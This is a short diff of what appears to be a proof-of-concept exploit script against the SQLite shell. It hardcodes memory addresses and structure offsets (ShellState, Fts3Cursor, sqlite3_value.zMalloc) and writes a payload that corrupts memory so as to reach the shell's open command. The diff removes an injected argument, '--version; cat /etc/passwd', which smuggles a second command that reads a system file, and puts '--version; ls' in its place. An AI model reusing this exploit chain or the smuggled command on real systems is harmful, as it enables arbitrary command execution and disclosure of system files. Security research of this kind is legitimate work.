@@ -120,8 +120,9 @@ addr_ShellState = 0x7fffffffcf68
 offset_doXdgOpen_ShellState = 0xe
 offset_zTempFile_ShellState = 0x98
 
+safe_space_offset = 0x400                 # leave the 1st attack untouched
+raddr_Fts3Cursor = safe_space_offset      # shift the first allocation
 
-base2 = base + 0x400
 dst_ptr = addr_ShellState + offset_zTempFile_ShellState
 
 # sqlite3_value.zMalloc = dst_ptr       (line 80328 @ sqlite3VdbeMemClearAndResize)
@@ -130,9 +131,9 @@ raddr_sqlite3_value_zMalloc = raddr_sqlite3_value + offset_sqlite3_value_zMalloc
 zMalloc_val = dst_ptr
 exp = writeVal(exp, raddr_sqlite3_value_zMalloc, zMalloc_val)
 
-# put "/bin/bash" after malicious content
-raddr_string = raddr_malicious_content + 0x10
-exp = writeStr(exp, raddr_string, "--version; cat /etc/passwd")
+# put "; bad-command" after malicious content
+raddr_string = raddr_malicious_content + 0x10  # leave the malicious value untouched
+exp = writeStr(exp, raddr_string, "--version; ls")
 
 # malicious_content = Your-bad-value
 exp = writeVal(exp, raddr_malicious_content, base + raddr_string)
